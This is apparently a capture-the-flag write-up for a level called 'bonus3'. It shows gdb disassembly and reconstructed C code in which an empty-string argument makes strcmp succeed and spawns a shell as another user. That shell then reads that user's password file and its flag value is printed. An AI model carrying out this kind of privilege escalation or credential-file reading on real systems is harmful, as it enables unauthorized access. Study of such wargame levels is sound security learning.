



```
  0x08048502 <+14>:	mov    $0x80486f0,%edx
   0x08048507 <+19>:	mov    $0x80486f2,%eax
=> 0x0804850c <+24>:	mov    %edx,0x4(%esp)
   0x08048513 <+31>:	call   0x8048410 <fopen@plt>

(gdb) x/s $edx
0x80486f0:	 "r"
(gdb) x/s $eax
0x80486f2:	 "/home/user/end/.pass"

fopen("/home/user/end/.pass", "r")
```

```

 repetitions, stores the contents of eax into where edi points to,
 incrementing or decrementing edi (depending on the direction flag) by 4 bytes each time. 
 
 Each iteration, ecx is decremented by 1, and the loop stops when it reaches zero.
 For stos, the only thing you will observe is that ecx is cleared at the end.
 
 
    0x08048528 <+52>:	mov    $0x21,%edx.    (33)
    0x0804852d <+57>:	mov    %ebx,%edi
    0x0804852f <+59>:	mov    %edx,%ecx
=>  0x08048531 <+61>:	rep stos %eax,%es:(%edi)

ecx            0x21	33
edx            0x21	33

ecx            0x13	19
edx            0x21	33

ecx            0x1	1
edx            0x21	33

ecx            0x0	0
edx            0x21	33
```

```
size_t fread( *ptr, size_t size, size_t nitems, FILE *stream);

```

```

 AT&T
  0x08048584 <+144>:	call   0x8048430 <atoi@plt>
  0x08048589 <+149>:	movb   $0x0,0x18(%esp,%eax,1)

INTEL 

0x08048589 <+149>:	mov    BYTE PTR [esp+eax*1+24],0
[buffer+eax] ~ [buffer+atoi(argv[1])] => buffer[atoi(argv[1]] = 0

```
```
*(&var_98 + atoi(argv[1])) = 0      // buffer[atoi(av[1])] = 0

 if (strcmp(&var_98, argv[1]) == 0) // strcmp(buffer, av[1])
     execl("/bin/sh", "sh", 0);


we don't know the value of the flag,
we know that atoi("") = 0 <===> buffer[atoi("")] = 0 
so strcmp(buffer, av[1]) will be considered equal
```

```
bonus3@RainFall:~$ ./bonus3 ""
$ pwd
/home/user/bonus3
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```










